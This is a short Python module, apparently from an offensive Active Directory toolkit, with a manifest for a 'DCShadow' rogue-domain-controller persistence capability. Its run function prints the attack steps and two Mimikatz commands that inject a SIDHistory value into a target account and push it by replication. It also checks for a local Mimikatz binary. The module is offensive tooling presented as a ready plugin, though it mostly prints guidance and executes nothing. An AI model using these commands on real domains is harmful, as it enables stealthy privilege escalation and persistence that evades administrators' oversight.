"""DCShadow  -  register rogue DC for stealthy AD modifications."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.persistence.dcshadow.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ad_replication", "rogue_dc_registration", "persistence"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1207"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    dc_ip = getattr(args, "dc_ip", None)

    print("[*] DCShadow: Rogue DC replication attack")
    print("[*] Domain: {}  Target DC: {}".format(cred.domain, dc_ip or "auto"))
    print("[!] WARNING: DCShadow requires SYSTEM + Domain Admin privileges")

    print("\n[*] DCShadow steps:")
    print("  1. Register rogue DC in AD (nTDSDSA object)")
    print("  2. Push changes via DRS replication")
    print("  3. Unregister rogue DC")
    print("\n[*] Mimikatz commands:")
    print("  # Terminal 1 (SYSTEM): lsadump::dcshadow /object:targetUser /attribute:SIDHistory /value:<SID>")
    print("  # Terminal 2 (DA): lsadump::dcshadow /push")

    import subprocess
    import shutil
    mimikatz = shutil.which("mimikatz") or shutil.which("mimikatz.exe")
    if mimikatz:
        print(f"\n[*] Mimikatz found: {mimikatz}")
    else:
        print("\n[*] Mimikatz not found locally")
        print("[*] Alternative: Use impacket DCShadow (when available)")

    return 0
